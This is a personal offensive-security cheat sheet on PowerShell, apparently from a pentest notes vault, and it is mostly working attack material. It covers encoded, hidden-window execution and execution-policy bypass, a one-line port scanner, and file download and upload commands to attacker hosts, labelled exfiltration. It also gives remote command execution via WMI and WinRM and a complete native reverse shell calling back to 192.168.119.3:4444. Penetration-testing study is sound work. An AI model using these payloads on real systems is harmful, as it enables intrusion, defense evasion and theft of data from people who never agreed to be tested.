---
tags:
  - "#type/tool"
  - "#attack/discovery"
  - "#attack/command-and-control"
  - "#attack/defense-evasion"
Link: https://learn.microsoft.com/en-us/powershell/scripting/how-to-use-docs
Purpose: powerful shell on windows
---
# Info

Useful features:

- PowerShell can directly execute encoded commands
- PowerShell can run any command available on your system, including [[3 Tools/shells/cmd|cmd]] and [[3 Tools/shells/bash|bash]] (if available)

# Usage

Check if you are running PowerShell or cmd: [[2 Tech-Specifics/Web/WebApp Attacks/Injection Attacks/Command Injection#Get environment info|Get environment Info]]

## Useful Options

| Option                            | Purpose                                    |
| --------------------------------- | ------------------------------------------ |
| `-enc <base64string>`             | execute base64 encoded command             |
| `-nop`                            | dont run customiztions of the user profile |
| `-exec bypass`<br>or `-ep bypass` | bypass execution policies                  |
| `-c`                              | execute string as command                  |
| `-w hidden`                       | hide the powershell window                 |

> [!HINT]
> When encoding a command with [[3 Tools/utilities/Cyberchef|Cyberchef]]:
> 1. apply "Encode Text" with option "UTF-16LE (1200)" (this is “Unicode” in .NET)
> 2. apply base64 encoding
> 
> [Cyberchef Recipe](https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-16LE%20%281200%29'%29To_Base64%28'A-Za-z0-9%2B/%3D'%29)

## Useful Commands

| Command                                                                           | Purpose                          |
| --------------------------------------------------------------------------------- | -------------------------------- |
| `Get-Help <command>`                                                              | Get Information about a command  |
| `Start-Process <executable/command> -ArgumentList '<argument1>'[, '<argument2>']` | Run command/process in backround |

### Filesystem

| Command                  | Purpose                                                                                                                                                     |
| ------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Select-String` or `sls` | equivilant to `grep`on linux                                                                                                                                |
| `icacls <path>`          | show permissions of file or folder<br>Reference: [Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) |

### Filter command output

| Command                                                                         | Purpose                                                                                                                                                                                                               |
| ------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Where-Object <property> -eq <value>`<br>or: `\| ? {$_.property -eq "<value>"}` | Filter results<br>Reference: [Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.5#-match)<br>also check other operators, e.g. `-contains` |
| `select <property>`                                                             | Filter properties to show in results                                                                                                                                                                                  |

### Service Management

| Command                       | Purpose       |
| ----------------------------- | ------------- |
| `Start-Service <servicename>` | start service |
| `Stop-Service <servicename`   | stop service  |

### Network

| Command                         | Purpose                                                                     |
| ------------------------------- | --------------------------------------------------------------------------- |
| `Resolve-DnsName <domain name>` | perform a [[2 Tech-Specifics/Network/Protocols/TCP,UDP 53 DNS\|DNS]] lookup |

### Run commands as another user

- if you have GUI access: use `runas \user:<user> <command>`
	- does not grant administrator privileges when UAC is enabled
- if user has an active session: use the `PsExec` tool

### Bypass execution policies

**Note:** Execution Policies can be enforced by Group Policies.

| Command                                                                                        | Purpose                                |
| ---------------------------------------------------------------------------------------------- | -------------------------------------- |
| `<script> -ExecutionPolicy Bypass`or<br>`powershell -ep bypass` to start a powershell instance | Disable on per-script basis            |
| `Get-ExecutionPolicy -Scope CurrentUser`                                                       | Show execution policy for current user |
| `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`                         | Disable for current user               |

# Snippets

## Generic

### Create a PSCredential object

In powershell, credentials are typically not passed using string arguments, but using a credential object. See [Microsoft Learn](https://learn.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions?view=powershell-7.5&viewFallbackFrom=powershell-7.2)

```powershell
$username = '<username>';
$password = '<password>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```

## Enumeration

See [[2 Tech-Specifics/OS/Windows/Enumeration - Windows/Manual Enumeration - Windows|Manual Enumeration - Windows]]

## Discovery

#### Perform TCP Port Scan

```powershell
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
```

#### Test Connection on One Tcp Port

```powershell
Test-NetConnection -Port 445 192.168.50.151
```

## Exfiltration

### Download a File

using System.Net.Webclient

```powershell
C:powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/<file>','<local_path>')
```

using wget (wget is an alias for Invoke-WebRequest):

```powershell
wget -O hijackme.dll IP:PORT/hijackme.dll
```

using Invoke-WebRequest (short form: `iwr`):

```powershell
Invoke-WebRequest -uri <url> -Outfile <path>
```

Add `-UseDefaultCredentials` to authenticate to the web service as the active user. This also makes use of cached [[2 Tech-Specifics/Network/Protocols/TCP,UDP 88 Kerberos|Kerberos]] tickets.

### Upload a File

using System.Net.WebClient:

```powershell
(New-Object System.Net.WebClient).UploadFile("http://<ip>:<port>/<filename>","POST","<filepath>")
```

using [[3 Tools/web/cURL|cURL]]:

```powershell

curl.exe -X POST --upload-file <filepath> http://<ip>:<port>/<filename>

```

**Note:** You MUST specify the `.exe`extension, since only `curl`is an alias for `Invoke-WebRequest`

## C2 & Lateral Movement

### WMI command execution

Also see [[2 Tech-Specifics/OS/Windows/WMI|WMI]]

To create the `$credential` object see [[#Create a PSCredential object]].

As `<command>` e.g. launch an encrypted [[#Reverse Shell Payload]]

```powershell
 = <target_ip>
$command = '<command>';
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName $target -Credential $credential -SessionOption $options 
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$command};
```

### PowerShell Remoting

See [Microsoft Learn](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting)

 Various protocols can be used to issue PowerShell commands on a remote machine:

 - [[2 Tech-Specifics/Network/Protocols/TCP 22 SSH|SSH]]
 - [[2 Tech-Specifics/Network/Protocols/TCP 5985,5986 WinRM|WinRM]]

#### New-PSSession

Uses [[2 Tech-Specifics/Network/Protocols/TCP 5985,5986 WinRM|WinRM]] for remoting.

To create the `$credential` object see [[#Create a PSCredential object]].

Create a remote session:

```powershell
New-PSSession -ComputerName <ip> -Credential $credential
```

Interact with the session: `Enter-PSSession <session_id>`

### Reverse Shell Payloads

There are various options:

- use [[3 Tools/shells/powercat|powercat]]
- use a native payload (see below)

PowerShell Native Reverse Shell:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

# Hardening
